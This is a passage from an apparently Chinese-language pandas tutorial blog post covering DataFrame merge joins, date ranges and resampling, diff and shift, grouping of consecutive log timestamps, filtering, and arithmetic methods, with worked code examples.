<p>​     merges通过设置how参数选择两个dataframe的连接方式，有内连接，外连接，左连接，右连接，下面通过例子介绍连接的含义。</p>
<h4 id="6-2-1-内连接-相同的列的交集】"><a href="#6-2-1-内连接-相同的列的交集】" class="headerlink" title="6.2.1 内连接[相同的列的交集】"></a>6.2.1 内连接[相同的列的交集】</h4><p>　　how=’inner’，dataframe的链接方式为内连接，我们可以理解基于共同列的交集进行连接，参数on设置连接的共有列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 单列的内连接</span><br><span class="line"># 定义df1  取共同列alpha值的交集进行连接。</span><br><span class="line"></span><br><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;feature1&#39;:[1,1,2,3,3,1],</span><br><span class="line">            &#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"># 定义df2</span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">            &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;)</span><br><span class="line"># print(df1)</span><br><span class="line"># print(df2)</span><br><span class="line"># 基于共同列alpha的内连接</span><br><span class="line"></span><br><span class="line">df3 &#x3D; pd.merge(df1,df2,how&#x3D;&#39;inner&#39;,on&#x3D;&#39;alpha&#39;)</span><br><span class="line">print(df3)</span><br></pre></td></tr></table></figure>



<h4 id="6-2-2-外连接-相同的列的并集】"><a href="#6-2-2-外连接-相同的列的并集】" class="headerlink" title="6.2.2 外连接[相同的列的并集】"></a>6.2.2 外连接[相同的列的并集】</h4><p>　　how=’outer’，dataframe的链接方式为外连接，我们可以理解基于共同列的并集进行连接，参数on设置连接的共有列名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 单列的外连接  若两个dataframe间除了on设置的连接列外并无相同列，则该列的值置为NaN</span><br><span class="line"></span><br><span class="line"># 定义df1</span><br><span class="line"></span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;feature1&#39;:[1,1,2,3,3,1],</span><br><span class="line">                &#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"></span><br><span class="line"># 定义df2</span><br><span class="line"></span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">                        &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;)</span><br><span class="line"></span><br><span class="line"># 基于共同列alpha的内连接</span><br><span class="line"></span><br><span class="line">df4 &#x3D; pd.merge(df1,df2,how&#x3D;&#39;outer&#39;,on&#x3D;&#39;alpha&#39;)</span><br><span class="line">print(df4)</span><br></pre></td></tr></table></figure>



<h4 id="6-2-3-左连接-左表加相同的列的交集】"><a href="#6-2-3-左连接-左表加相同的列的交集】" class="headerlink" title="6.2.3 左连接[左表加相同的列的交集】"></a>6.2.3 左连接[左表加相同的列的交集】</h4><p>　　how=’left’，dataframe的链接方式为左连接，我们可以理解基于左边位置dataframe的列进行连接，参数on设置连接的共有列名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 单列的左连接</span><br><span class="line"># 定义df1</span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;feature1&#39;:[1,1,2,3,3,1],</span><br><span class="line">    &#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"></span><br><span class="line"># 定义df2</span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">                        &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;)</span><br><span class="line"></span><br><span class="line"># 基于共同列alpha的左连接</span><br><span class="line"></span><br><span class="line">df5 &#x3D; pd.merge(df1,df2,how&#x3D;&#39;left&#39;,on&#x3D;&#39;alpha&#39;)</span><br><span class="line">print(df5)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​     因为df2的连接列alpha有两个’A’值，所以左连接的df5有两个’A’值，若两个dataframe间除了on设置的连接列外并无相同列，则该列的值置为NaN。</p>
<p>   6.2.4 右连接[右表加相同的列的交集，数据以右表为基准】</p>
<p>　 how=’right’，dataframe的链接方式为左连接，我们可以理解基于右边位置dataframe的列进行连接，参数on设置连接的共有列名。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 单列的右连接</span><br><span class="line"># 定义df1</span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;feature1&#39;:[1,1,2,3,3,1],</span><br><span class="line">&#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"></span><br><span class="line"># 定义df2</span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">                        &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;)</span><br><span class="line"></span><br><span class="line"># 基于共同列alpha的右连接</span><br><span class="line"></span><br><span class="line">df6 &#x3D; pd.merge(df1,df2,how&#x3D;&#39;right&#39;,on&#x3D;&#39;alpha&#39;)</span><br><span class="line">print(df6)</span><br></pre></td></tr></table></figure>

<p>  因为df1的连接列alpha有两个’B’值，所以右连接的df6有两个’B’值。若两个dataframe间除了on设置的连接列外并无相同列，则该列的值置为NaN。</p>
<h4 id="6-2-5-基于多列的连接算法"><a href="#6-2-5-基于多列的连接算法" class="headerlink" title="6.2.5 基于多列的连接算法"></a>6.2.5 基于多列的连接算法</h4><p>　　多列连接的算法与单列连接一致，本节只介绍基于多列的内连接和右连接，读者可自己编码并按照本文给出的图解方式去理解外连接和左连接。<br>多列的内连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 多列的内连接</span><br><span class="line"># 定义df1</span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;beta&#39;:[&#39;a&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;c&#39;,&#39;e&#39;],</span><br><span class="line">                    &#39;feature1&#39;:[1,1,2,3,3,1],&#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"></span><br><span class="line"># 定义df2</span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;beta&#39;:[&#39;d&#39;,&#39;d&#39;,&#39;b&#39;,&#39;f&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">                        &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;)</span><br><span class="line"># 基于共同列alpha和beta的内连接</span><br><span class="line"></span><br><span class="line">df7 &#x3D; pd.merge(df1,df2,on&#x3D;[&#39;alpha&#39;,&#39;beta&#39;],how&#x3D;&#39;inner&#39;)</span><br><span class="line">print(df7)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>   多列的右连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 多列的右连接</span><br><span class="line"></span><br><span class="line"># 定义df1</span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;beta&#39;:[&#39;a&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;c&#39;,&#39;e&#39;],</span><br><span class="line">                    &#39;feature1&#39;:[1,1,2,3,3,1],&#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"># 定义df2</span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;beta&#39;:[&#39;d&#39;,&#39;d&#39;,&#39;b&#39;,&#39;f&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">                        &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;)</span><br><span class="line">print(df1)</span><br><span class="line">print(df2)</span><br><span class="line"></span><br><span class="line"># 基于共同列alpha和beta的右连接</span><br><span class="line">df8 &#x3D; pd.merge(df1,df2,on&#x3D;[&#39;alpha&#39;,&#39;beta&#39;],how&#x3D;&#39;right&#39;)</span><br><span class="line">print(df8)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="6-2-6-基于index的连接方法"><a href="#6-2-6-基于index的连接方法" class="headerlink" title="6.2.6 基于index的连接方法"></a>6.2.6 基于index的连接方法</h4><p>​    前面介绍了基于column的连接方法，merge方法亦可基于index连接dataframe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 基于column和index的右连接</span><br><span class="line"></span><br><span class="line"># 定义df1</span><br><span class="line">df1 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;B&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;],&#39;beta&#39;:[&#39;a&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;c&#39;,&#39;e&#39;],</span><br><span class="line">                    &#39;feature1&#39;:[1,1,2,3,3,1],&#39;feature2&#39;:[&#39;low&#39;,&#39;medium&#39;,&#39;medium&#39;,&#39;high&#39;,&#39;low&#39;,&#39;high&#39;]&#125;)</span><br><span class="line"></span><br><span class="line"># 定义df2</span><br><span class="line">df2 &#x3D; pd.DataFrame(&#123;&#39;alpha&#39;:[&#39;A&#39;,&#39;A&#39;,&#39;B&#39;,&#39;F&#39;],&#39;pazham&#39;:[&#39;apple&#39;,&#39;orange&#39;,&#39;pine&#39;,&#39;pear&#39;],</span><br><span class="line">                        &#39;kilo&#39;:[&#39;high&#39;,&#39;low&#39;,&#39;high&#39;,&#39;medium&#39;],&#39;price&#39;:np.array([5,6,5,7])&#125;,index&#x3D;[&#39;d&#39;,&#39;d&#39;,&#39;b&#39;,&#39;f&#39;])</span><br><span class="line">print(df1)</span><br><span class="line">print(df2)</span><br><span class="line"># 基于df1的beta列和df2的index连接，left_on&#x3D;&#39;beta&#39; 表示左边这一列作为右边的索引</span><br><span class="line">df9 &#x3D; pd.merge(df1,df2,how&#x3D;&#39;inner&#39;,left_on&#x3D;&#39;beta&#39;,right_index&#x3D;True)</span><br><span class="line">df9</span><br></pre></td></tr></table></figure>




<p> 设置参数suffixes以修改除连接列外相同列的后缀名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 基于df1的alpha列和df2的index内连接</span><br><span class="line"></span><br><span class="line">df9 &#x3D; pd.merge(df1,df2,how&#x3D;&#39;inner&#39;,left_on&#x3D;&#39;beta&#39;,right_index&#x3D;True,suffixes&#x3D;(&#39;_df1&#39;,&#39;_df2&#39;))</span><br><span class="line">df9</span><br></pre></td></tr></table></figure>



<h2 id="7、时间序列，重采样"><a href="#7、时间序列，重采样" class="headerlink" title="7、时间序列，重采样"></a>7、时间序列，重采样</h2><h3 id="7-1、pd-date-range-如按月区间生成序列"><a href="#7-1、pd-date-range-如按月区间生成序列" class="headerlink" title="7.1、pd.date_range 如按月区间生成序列"></a>7.1、pd.date_range 如按月区间生成序列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">date_range(start&#x3D;None, end&#x3D;None, periods&#x3D;None, freq&#x3D;None, tz&#x3D;None,normalize&#x3D;False, name&#x3D;None, closed&#x3D;None, **kwargs)</span><br></pre></td></tr></table></figure>




<ul>
<li><p>start 开始时间</p>
</li>
<li><p>end 结束时间</p>
</li>
<li><p>periods 固定日期范围，整数</p>
</li>
<li><p>normalize 若参数为True表示将start、end参数值正则化到午夜时间戳</p>
</li>
<li><p>name 生成时间索引对象名称</p>
</li>
<li><p>freq 日期偏移量，默认为D</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pd.date_range(&#39;20200801&#39;,&#39;20200810&#39;)</span><br><span class="line">pd.date_range(start&#x3D;&#39;20200801&#39;,periods&#x3D;10)</span><br><span class="line">pd.date_range(end&#x3D;&#39;20200810&#39;,periods&#x3D;10)</span><br></pre></td></tr></table></figure>




<table>
<thead>
<tr>
<th>别名</th>
<th>偏移量类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>D</td>
<td>Day</td>
<td>每日历日</td>
</tr>
<tr>
<td>B</td>
<td>BusinessDay</td>
<td>每工作日</td>
</tr>
<tr>
<td>H</td>
<td>Hour</td>
<td>每小时</td>
</tr>
<tr>
<td>T/min</td>
<td>Minute</td>
<td>每分</td>
</tr>
<tr>
<td>S</td>
<td>Second</td>
<td>每秒</td>
</tr>
<tr>
<td>L/ms</td>
<td>Million</td>
<td>每毫秒</td>
</tr>
<tr>
<td>U</td>
<td>Micro</td>
<td>每微妙</td>
</tr>
<tr>
<td>M</td>
<td>MonthEnd</td>
<td>每月最后一个日历日</td>
</tr>
<tr>
<td>BM</td>
<td>BusinessMonthEnd</td>
<td>每月最后一个工作日</td>
</tr>
<tr>
<td>MS</td>
<td>MonthBegin</td>
<td>每月第一个日历日</td>
</tr>
<tr>
<td>BMS</td>
<td>BusinessMonthBegin</td>
<td>每月第一个工作日</td>
</tr>
<tr>
<td>W-MON、W-TUE…</td>
<td>Week</td>
<td>从指定的星期几开始算起，每周</td>
</tr>
<tr>
<td>WOM-1MON、WOM-2MON…</td>
<td>WeekOfMonth</td>
<td>产生每月第一、二、三、四周的星期几，例如WOM-1MON表示每月的第一个星期一</td>
</tr>
<tr>
<td>Q-JAN、Q-FEB…</td>
<td>QuarterEnd</td>
<td>对于以指定月份（JAN、FEB、…、DEC）结束的年度，每季度的最后一月的最后一个日历日</td>
</tr>
<tr>
<td>BQ-JAN、BQ-FEB…</td>
<td>BusinessQuarterEnd</td>
<td>对于以指定月份（JAN、FEB、…、DEC）结束的年度，每季度的最后一月的最后一个工作日</td>
</tr>
<tr>
<td>QS-JAN、QS-FEB…</td>
<td>QuarterBegin</td>
<td>对于以指定月份（JAN、FEB、…、DEC）结束的年度，每季度的最后一月的第一个日历日</td>
</tr>
<tr>
<td>BQS-JAN、BQS-FEB…</td>
<td>BusinessQuarterBegin</td>
<td>对于以指定月份（JAN、FEB、…、DEC）结束的年度，每季度的最后一月的第一个工作日</td>
</tr>
<tr>
<td>A-JAN、A-FEB…</td>
<td>YearEnd</td>
<td>每年指定月份最后一个日历日</td>
</tr>
<tr>
<td>BA-JAN、BA-FEB…</td>
<td>BusinessYearEnd</td>
<td>每年指定月份最后一个工作日</td>
</tr>
<tr>
<td>AS-JAN、AS-FEB…</td>
<td>YearBegin</td>
<td>每月指定月份第一个日历日</td>
</tr>
<tr>
<td>BAS-JAN、BAS-FEB…</td>
<td>BusinessYearBegin</td>
<td>每月指定月份第一个工作日</td>
</tr>
</tbody></table>
<h3 id="7-2、resample-按时间聚合"><a href="#7-2、resample-按时间聚合" class="headerlink" title="7.2、resample 按时间聚合"></a>7.2、resample 按时间聚合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">index &#x3D; pd.date_range(&#39;1&#x2F;1&#x2F;2000&#39;, periods&#x3D;9, freq&#x3D;&#39;T&#39;)</span><br><span class="line">series &#x3D; pd.Series(range(9), index&#x3D;index)</span><br><span class="line">z&#x3D;series.resample(&#39;3T&#39;).sum()</span><br><span class="line">print(z)</span><br></pre></td></tr></table></figure>

<h3 id="7-3、Timedelta"><a href="#7-3、Timedelta" class="headerlink" title="7.3、Timedelta"></a>7.3、Timedelta</h3><p>对日期和时间进行加减实际上就是把datetime往后或往前计算，得到新的datetime。加减可以直接用+和-运算符，需要导入timedelta这个类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#计算当前时间往后100天的日期</span><br><span class="line">dt&#x3D;now+pd.Timedelta(days&#x3D;100)</span><br><span class="line">#只显示年月日</span><br><span class="line">dt.strftime(&#39;%Y-%m-%d&#39;)</span><br></pre></td></tr></table></figure>



<h2 id="8、离散处理"><a href="#8、离散处理" class="headerlink" title="8、离散处理"></a>8、离散处理</h2><h3 id="1、diff函数"><a href="#1、diff函数" class="headerlink" title="1、diff函数"></a>1、diff函数</h3><p>第一个离散的元素差异</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DataFrame.diff(self, periods&#x3D;1, axis&#x3D;0)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>periods ： int，默认值1 用于计算差异的周期，接受负值。</p>
</li>
<li><p>axis ： {0或’index’，1或’columns’}，默认为0 区分行（0）或列（1）。</p>
</li>
</ul>
<blockquote>
<blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.DataFrame(&#123;&#39;a&#39;: [1, 2, 3, 4, 5, 6],</span><br><span class="line">...                    &#39;b&#39;: [1, 1, 2, 3, 5, 8],</span><br><span class="line">...                    &#39;c&#39;: [1, 4, 9, 16, 25, 36]&#125;)</span><br><span class="line">df</span><br><span class="line">a  b   c</span><br><span class="line">0  1  1   1</span><br><span class="line">1  2  1   4</span><br><span class="line">2  3  2   9</span><br><span class="line">3  4  3  16</span><br><span class="line">4  5  5  25</span><br><span class="line">5  6  8  36</span><br><span class="line">df.diff()</span><br><span class="line">a    b     c</span><br><span class="line">0  NaN  NaN   NaN</span><br><span class="line">1  1.0  0.0   3.0</span><br><span class="line">2  1.0  1.0   5.0</span><br><span class="line">3  1.0  1.0   7.0</span><br><span class="line">4  1.0  2.0   9.0</span><br></pre></td></tr></table></figure>

<p>5  1.0  3.0  11.0</p>
</blockquote>
</blockquote>
</blockquote>
<p>与前一列的差异</p>
<blockquote>
<blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.diff(axis&#x3D;1)</span><br><span class="line">a    b     c</span><br><span class="line">0 NaN  0.0   0.0</span><br><span class="line">1 NaN -1.0   3.0</span><br><span class="line">2 NaN -1.0   7.0</span><br><span class="line">3 NaN -1.0  13.0</span><br><span class="line">4 NaN  0.0  20.0</span><br><span class="line">5 NaN  2.0  28.0</span><br></pre></td></tr></table></figure>


</blockquote>
</blockquote>
</blockquote>
<p>与第3行的差异</p>
<blockquote>
<blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.diff(periods&#x3D;3)</span><br><span class="line">a    b     c</span><br><span class="line">0  NaN  NaN   NaN</span><br><span class="line">1  NaN  NaN   NaN</span><br><span class="line">2  NaN  NaN   NaN</span><br><span class="line">3  3.0  2.0  15.0</span><br><span class="line">4  3.0  4.0  21.0</span><br><span class="line">5  3.0  6.0  27.0</span><br></pre></td></tr></table></figure>


</blockquote>
</blockquote>
</blockquote>
<p>与以下行的差异</p>
<blockquote>
<blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df.diff(periods&#x3D;-1)</span><br><span class="line">a    b     c</span><br><span class="line">0 -1.0  0.0  -3.0</span><br><span class="line">1 -1.0 -1.0  -5.0</span><br><span class="line">2 -1.0 -1.0  -7.0</span><br><span class="line">3 -1.0 -2.0  -9.0</span><br><span class="line">4 -1.0 -3.0 -11.0</span><br><span class="line">5  NaN  NaN   NaN</span><br></pre></td></tr></table></figure>


</blockquote>
</blockquote>
</blockquote>
<h2 id="9、移动函数"><a href="#9、移动函数" class="headerlink" title="9、移动函数"></a>9、移动函数</h2><h3 id="9-1、移动函数shift"><a href="#9-1、移动函数shift" class="headerlink" title="9.1、移动函数shift"></a>9.1、移动函数shift</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DataFrame.shift(periods&#x3D;1, freq&#x3D;None, axis&#x3D;0, fill_value&#x3D;&lt;no_default&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li>periods：表示移动的幅度，可正可负；默认值是1，1就表示移动一次。注意这里移动的都是数据，而索引是不移动的，移动之后没有对应值的，就赋值为NaN。</li>
<li>freq：DateOffset, timedelta, or time rule string，可选参数，默认值为None，只适用于时间序列。如果这个参数存在，那么会按照参数值移动时间索引，而数据值没有发生变化。</li>
<li>axis：表示按照哪个轴移动。axis=0表示index，横轴；axis=1表示columns，纵轴</li>
<li>fill_value：表示当我们数据发生了移动之后，产生的缺失值用什么数据填充。如果是数值型的缺失值，用np.nan；如果是时间类型的缺失值，用NaT（not a time）</li>
</ul>
<h2 id="10、时间连续性"><a href="#10、时间连续性" class="headerlink" title="10、时间连续性"></a>10、时间连续性</h2><p>但是存在一个问题，需要先按照时间排序，并且如果日期相同，也会判断错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">t&#x3D;&#123;&quot;DateAnalyzed&quot;:[&quot;2018-03-18&quot;,&quot;2018-03-19&quot;,&quot;2018-03-20&quot;,&quot;2017-01-20&quot;,&quot;2018-09-25&quot;,&quot;2018-09-26&quot;,&quot;2018-09-27&quot;],&quot;Val&quot;:[0.470253,0.470253,0.470253,0.485949,0.467729,0.467729,0.467729]&#125;</span><br><span class="line"></span><br><span class="line">df&#x3D;pd.DataFrame(t)</span><br><span class="line">df[&quot;DateAnalyzed&quot;]&#x3D;pd.to_datetime(df[&quot;DateAnalyzed&quot;])</span><br><span class="line"></span><br><span class="line">print(df.dtypes)</span><br><span class="line">dt &#x3D; df[&#39;DateAnalyzed&#39;]</span><br><span class="line"></span><br><span class="line">day &#x3D; pd.Timedelta(&#39;1d&#39;)</span><br><span class="line">in_block &#x3D; ((dt - dt.shift(-1)).abs() &#x3D;&#x3D; day) | (dt.diff() &#x3D;&#x3D; day)</span><br><span class="line"></span><br><span class="line">filt &#x3D; df.loc[in_block]</span><br><span class="line">breaks &#x3D; filt[&#39;DateAnalyzed&#39;].diff() !&#x3D; day</span><br><span class="line">groups &#x3D; breaks.cumsum()</span><br><span class="line">print(groups)</span><br><span class="line">for _, frame in filt.groupby(groups):</span><br><span class="line">   print(frame, end&#x3D;&#39;\n\n&#39;)</span><br></pre></td></tr></table></figure>



<p>已解决时间连续性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"># t&#x3D;&#123;&quot;DateAnalyzed&quot;:[&quot;2018-03-18&quot;,&quot;2018-03-19&quot;,&quot;2018-03-20&quot;,&quot;2017-01-20&quot;,&quot;2018-09-25&quot;,&quot;2018-09-26&quot;,&quot;2018-09-27&quot;],&quot;Val&quot;:[0.470253,0.470253,0.470253,0.485949,0.467729,0.467729,0.467729]&#125;</span><br><span class="line">df &#x3D; pd.read_csv(&quot;all1.csv&quot;, index_col&#x3D;None, header&#x3D;0, error_bad_lines&#x3D;False, encoding&#x3D;&quot;gbk&quot;,parse_dates&#x3D;True).copy()</span><br><span class="line"></span><br><span class="line">df[&quot;日志接收时间&quot;] &#x3D; pd.to_datetime(df[&quot;日志接收时间&quot;])</span><br><span class="line">df&#x3D;df.sort_values(&quot;日志接收时间&quot;)</span><br><span class="line">dt &#x3D; df[&#39;日志接收时间&#39;]</span><br><span class="line">day &#x3D; pd.Timedelta(minutes&#x3D;1)</span><br><span class="line">day1 &#x3D; pd.Timedelta(minutes&#x3D;0)</span><br><span class="line">in_block &#x3D; ((dt - dt.shift(1)).abs() &#x3D;&#x3D; day) |((dt - dt.shift(1)).abs() &#x3D;&#x3D; day1)</span><br><span class="line">b&#x3D;(in_block&#x3D;&#x3D;False)</span><br><span class="line">filt &#x3D; df.loc[in_block]</span><br><span class="line">groups &#x3D; b.cumsum()</span><br><span class="line">for _, frame in df.groupby(groups):</span><br><span class="line">   print(frame, end&#x3D;&#39;\n\n&#39;)</span><br><span class="line"></span><br><span class="line">将TRUE和false颠倒</span><br><span class="line">b&#x3D;(in_block&#x3D;&#x3D;False)</span><br></pre></td></tr></table></figure>

<h2 id="11、过滤"><a href="#11、过滤" class="headerlink" title="11、过滤"></a><strong>11、过滤</strong></h2><h3 id="11-1、基本过滤"><a href="#11-1、基本过滤" class="headerlink" title="11.1、基本过滤"></a><strong>11.1、基本过滤</strong></h3><p>df[df[“size”]&gt;=10]  #过滤df的size字段中大于10的</p>
<h3 id="11-2、过滤字段的某个值在一个列表中isin"><a href="#11-2、过滤字段的某个值在一个列表中isin" class="headerlink" title="11.2、过滤字段的某个值在一个列表中isin()"></a><strong>11.2、过滤字段的某个值在一个列表中isin()</strong></h3><ul>
<li><strong>isin(),返回值为true false  ，~取反</strong></li>
</ul>
<p>protocol=[“imap”]     port=[“143.0”,”993.0”] #获取传输协议为imap的 df[(df[“传输协议”].isin(protocol))] #<del>取反，获取目的端口不为143，993的 df[(</del>df[“目的端口”].isin(port))]</p>
<h3 id="11-3、获取多个字段的值"><a href="#11-3、获取多个字段的值" class="headerlink" title="11.3、获取多个字段的值"></a><strong>11.3、获取多个字段的值</strong></h3><p>df[[‘源IP地址’, ‘目的IP地址’]]</p>
<h2 id="12、算数方法"><a href="#12、算数方法" class="headerlink" title="12、算数方法"></a><strong>12、算数方法</strong></h2><h3 id="12-1、add"><a href="#12-1、add" class="headerlink" title="12.1、add"></a><strong>12.1、add</strong></h3><p>df1.add(df2,fill_value=0)</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
<th>范例</th>
</tr>
</thead>
<tbody><tr>
<td>add  | radd</td>
<td>加法</td>
<td>df1.add(df2)==df1+df2df1.radd(df2)==df2+df1</td>
</tr>
<tr>
<td>sub  | rsub</td>
<td>减法</td>
<td>df1.sub(df2)==df1-df2df1.rsub(df2)==df2-df1</td>
</tr>
<tr>
<td>div  | rdiv</td>
<td>除法</td>
<td>df1.div(df2)==df1/df2df1.div(1)==1/df1[可以是数字,如果表里都是数字]</td>
</tr>
<tr>
<td>floordiv | rfloordiv</td>
<td>整除</td>
<td>df1.loordiv(df2)==df1//df2df1.rloordiv(df2)==df2//df1</td>
</tr>
<tr>
<td>mul  | rmul</td>
<td>乘法</td>
<td>df1.mul(df2)==df1<em>df2df1.rmul(df2)==df2</em>df1</td>
</tr>
<tr>
<td>pow | rpow</td>
<td>幂次方</td>
<td>df1.pow(df2)==df1<strong>df2df1.rpow(df2)==df2</strong>df1</td>
</tr>
</tbody></table>
<h3 id="12-2、常用函数"><a href="#12-2、常用函数" class="headerlink" title="12.2、常用函数"></a><strong>12.2、常用函数</strong></h3><p>info[‘x’].max()   #获取最大值 info[‘x’].min()   #获取最小值 info.mean()       #获取均值，获取列的均值</p>
<p>x=np.array([np.arange(5),np.arange(5),np.arange(3,8)]) df=pd.DataFrame(x) print(df.values) print(df.mean()) print(df[0].mean())</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-16494859740291.png" alt="img"></p>
<p><strong>参考链接</strong></p>
<p>pandas常用函数：<a href="https://www.cjavapy.com/article/388/">https://www.cjavapy.com/article/388/</a></p>
<p>合并：<a href="https://www.jb51.net/article/231326.htm">https://www.jb51.net/article/231326.htm</a></p>
<p>时间连续性：<a href="https://www.cnblogs.com/zcsh/p/14790823.html">https://www.cnblogs.com/zcsh/p/14790823.html</a></p>
